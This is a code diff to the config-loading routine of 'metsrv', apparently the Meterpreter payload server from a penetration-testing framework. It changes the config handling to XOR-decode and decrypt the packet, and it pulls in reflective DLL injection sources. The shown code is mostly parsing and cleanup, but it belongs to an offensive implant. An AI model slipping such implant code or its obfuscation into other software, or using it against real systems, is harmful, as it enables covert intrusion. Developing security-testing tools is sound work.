@@ -14,22 +14,32 @@
 #include "../ReflectiveDLLInjection/inject/src/GetProcAddressR.c"
 #include "../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"
 
+#include "packet_encryption.h"
+
 DWORD Init(MetsrvConfig* config)
 {
 	dprintf("[METSRV] Initializing from configuration: 0x%p", config);
 
-	Packet* configPacket = packet_create_group();
-	configPacket->local = TRUE;
-	configPacket->payload = config->config_tlv;
-	configPacket->payloadLength = ntohl(((TlvHeader*)(configPacket->payload))->length) + sizeof(TlvHeader);
+	// take a copy of the packet header so that we can manipulate it locally
+	PacketHeader header = *(PacketHeader*)config->config_packet;
 
-	dprintf("Group TLV Packet Size: 0x%x (%u)", configPacket->payloadLength, configPacket->payloadLength);
+	// decode as it might be xor'd
+	xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
 
-	Tlv configTlv = { 0 };
-	packet_get_tlv(configPacket, TLV_TYPE_CONFIG_BLOCK, &configTlv);
+	UINT configLength = ntohl(header.length) - sizeof(TlvHeader);
+	UINT configBlockSize = sizeof(PacketHeader) + configLength;
+	dprintf("[METSRV] Config length is %u 0x%08x", configLength, configLength);
+	dprintf("[METSRV] Config block size is %u 0x%08x", configBlockSize, configBlockSize);
+
+	// Get a full copy of the entire packet ready for decoding
+	PBYTE configBuffer = (PBYTE)malloc(configBlockSize);
+	memcpy_s(configBuffer, configBlockSize, config->config_packet, configBlockSize);
+	Packet* configPacket = NULL;
+	dprintf("[METSRV] decrypting config packet");
+	SetLastError(decrypt_packet(NULL, &configPacket, configBuffer, configBlockSize));
 
 #ifdef DEBUGTRACE
-	PWSTR logPath = packet_get_tlv_group_entry_value_wstring(configPacket, &configTlv, TLV_TYPE_DEBUG_LOG, NULL);
+	PWSTR logPath = packet_get_tlv_value_wstring(configPacket, TLV_TYPE_DEBUG_LOG);
 	INIT_LOGGING(logPath);
 	free(logPath);
 #endif
@@ -42,11 +52,12 @@ DWORD Init(MetsrvConfig* config)
 	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
 	// a pointer to the metserv configuration, so do a nasty cast and move on.
 	dprintf("[METSRV] Getting ready to init with config %p", config);
-	DWORD result = server_setup(config, configPacket, &configTlv);
-	UINT exitFunc = packet_get_tlv_group_entry_value_uint(configPacket, &configTlv, TLV_TYPE_EXITFUNC);
+	DWORD result = server_setup(config, configPacket);
+	UINT exitFunc = packet_get_tlv_value_uint(configPacket, TLV_TYPE_EXITFUNC);
 
 	dprintf("[METSRV] Exiting with %08x", exitFunc);
 
+	packet_destroy(configPacket);
 	// We also handle exit func directly in metsrv now because the value is added to the
 	// configuration block and we manage to save bytes in the stager/header as well.
 	switch (exitFunc)
@@ -63,9 +74,6 @@ DWORD Init(MetsrvConfig* config)
 	default:
 		break;
 	}
-	// we don't want destruction to free the payload pointer.
-	configPacket->payload = NULL;
-	packet_destroy(configPacket);
 	return result;
 }
 
